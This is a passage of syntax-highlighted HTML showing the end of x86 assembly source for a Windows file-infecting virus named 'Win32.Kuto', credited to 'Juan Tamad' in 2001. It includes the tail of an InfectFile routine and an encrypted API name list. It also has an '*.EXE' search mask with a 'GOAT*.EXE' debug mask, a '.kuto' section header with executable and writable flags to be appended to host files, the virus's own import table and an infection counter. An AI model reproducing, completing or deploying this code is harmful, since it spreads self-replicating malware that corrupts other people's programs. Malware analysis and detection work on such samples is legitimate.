        </span><span class="sc5">api</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">CloseHandle@</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">hMap</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc5">api</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">CloseHandle@</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">hFile</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">InfectFile</span><span class="sc0"> </span><span class="sc9">ENDP</span><span class="sc0">

</span><span class="sc1">;様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様幼陳</span><span class="sc0">
</span><span class="sc9">align</span><span class="sc5">@</span><span class="sc0">  </span><span class="sc9">PROC</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc9">.if</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0"> !</span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc9">.endif</span><span class="sc0">
        </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc9">align</span><span class="sc5">@</span><span class="sc0">  </span><span class="sc9">ENDP</span><span class="sc0">

</span><span class="sc1">;様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様陳陳</span><span class="sc0">

</span><span class="sc5">Copyleft</span><span class="sc0">        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"Win32.Kuto - (c) 2oo1 Juan Tamad. "</span><span class="sc0">
                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"Made in the Philippines."</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">;--------------------------------------</span><span class="sc0">
</span><span class="sc5">szApi</span><span class="sc0">   </span><span class="sc9">MACRO</span><span class="sc0">   </span><span class="sc5">ApiName</span><span class="sc0">
        </span><span class="sc5">ApiName</span><span class="sc4">&amp;</span><span class="sc5">@</span><span class="sc0"> </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                  </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc3">"&amp;ApiName&amp;"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc9">ENDM</span><span class="sc0">
</span><span class="sc1">;--------------------------------------</span><span class="sc0">

        </span><span class="sc5">@szApi</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc5">szApi</span><span class="sc0">   </span><span class="sc5">CreateFileA</span><span class="sc0">                     </span><span class="sc1">; These apis can be present</span><span class="sc0">
        </span><span class="sc5">szApi</span><span class="sc0">   </span><span class="sc5">CreateFileMappingA</span><span class="sc0">              </span><span class="sc1">; on the import table.</span><span class="sc0">
        </span><span class="sc5">szApi</span><span class="sc0">   </span><span class="sc5">MapViewOfFile</span><span class="sc0">                   </span><span class="sc1">; but,</span><span class="sc0">
        </span><span class="sc5">szApi</span><span class="sc0">   </span><span class="sc5">UnmapViewOfFile</span><span class="sc0">                 </span><span class="sc1">; they are here so they can</span><span class="sc0">
        </span><span class="sc5">szApi</span><span class="sc0">   </span><span class="sc5">SetFilePointer</span><span class="sc0">                  </span><span class="sc1">; encrypted.</span><span class="sc0">
        </span><span class="sc5">szApi</span><span class="sc0">   </span><span class="sc5">SetEndOfFile</span><span class="sc0">                    </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc5">szApi</span><span class="sc0">   </span><span class="sc5">VirtualProtect</span><span class="sc0">
        </span><span class="sc5">szApi</span><span class="sc0">   </span><span class="sc5">FindFirstFileA</span><span class="sc0">
        </span><span class="sc5">szApi</span><span class="sc0">   </span><span class="sc5">FindNextFileA</span><span class="sc0">
        </span><span class="sc5">szApi</span><span class="sc0">   </span><span class="sc5">FindClose</span><span class="sc0">
        </span><span class="sc5">szApi</span><span class="sc0">   </span><span class="sc5">CloseHandle</span><span class="sc0">
        </span><span class="sc5">szApi</span><span class="sc0">   </span><span class="sc5">IsBadReadPtr</span><span class="sc0">
                </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">

</span><span class="sc9">IF</span><span class="sc0"> </span><span class="sc5">DEBUG</span><span class="sc0">
 </span><span class="sc5">szMask</span><span class="sc0">         </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"GOAT*.EXE"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc9">ELSE</span><span class="sc0">
 </span><span class="sc5">szMask</span><span class="sc0">         </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"*.EXE"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc9">ENDIF</span><span class="sc0">

</span><span class="sc1">; Add these to section table</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">Kuto_Name</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'.kuto'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Kuto_VSize</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">VIRSIZE</span><span class="sc0">
</span><span class="sc5">Kuto_RVA</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Kuto_RSize</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">VIRSIZE</span><span class="sc0">
</span><span class="sc5">Kuto_Offs</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Kuto_Flags</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0E0000020h</span><span class="sc0">      </span><span class="sc1">; C/E/R/W</span><span class="sc0">

</span><span class="sc1">;様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様陳陳</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; This is the virus import table. This method can be found in almost all</span><span class="sc0">
</span><span class="sc1">; PE protectors/packers. It is somehow an alternative solution to the</span><span class="sc0">
</span><span class="sc1">; problem of finding KERNEL32 and API addresses.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; All dwords are RVA.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc9">align</span><span class="sc0">   </span><span class="sc2">4</span><span class="sc0">

</span><span class="sc5">ImportTableBegin</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">K32</span><span class="sc0">             </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc5">szK32</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ImportTableBegin</span><span class="sc0">
</span><span class="sc5">K32_IAT_RVA</span><span class="sc0">     </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc5">K32_IAT</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ImportTableBegin</span><span class="sc0">
                </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">5</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">

                </span><span class="sc5">K32_IAT</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">GetModuleHandleA@</span><span class="sc0"> </span><span class="sc9">DD</span><span class="sc0">     </span><span class="sc5">GetModuleHandleA</span><span class="sc0">
</span><span class="sc5">LoadLibrary@</span><span class="sc0">    </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc5">LoadLibraryA</span><span class="sc0">
</span><span class="sc5">GetProcAddress@</span><span class="sc0"> </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc5">GetProcAddress</span><span class="sc0">
</span><span class="sc5">ExitProcess@</span><span class="sc0">    </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc5">ExitProcess</span><span class="sc0">
                </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">szK32</span><span class="sc0">           </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"KERNEL32.DLL"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">szGMH</span><span class="sc0">           </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"GetModuleHandleA"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">szLL</span><span class="sc0">            </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"LoadLibraryA"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">szGPA</span><span class="sc0">           </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"GetProcAddress"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">szEXIT</span><span class="sc0">          </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"ExitProcess"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

                </span><span class="sc9">align</span><span class="sc0">   </span><span class="sc2">4</span><span class="sc0">

</span><span class="sc5">VirEnd</span><span class="sc0">          </span><span class="sc9">LABEL</span><span class="sc0">

</span><span class="sc5">hModule</span><span class="sc0">         </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">hFind</span><span class="sc0">           </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">hFile</span><span class="sc0">           </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">hMap</span><span class="sc0">            </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">MapBase</span><span class="sc0">         </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Temp</span><span class="sc0">            </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Infected</span><span class="sc0">        </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">; infection counter</span><span class="sc0">
</span><span class="sc5">wfd</span><span class="sc0">             </span><span class="sc5">WIN32_FIND_DATA</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc2">0</span><span class="sc4">&gt;</span><span class="sc0">

                </span><span class="sc9">END</span><span class="sc0">             </span><span class="sc5">HostEntry</span><span class="sc0">

</span></div></body>
</html>
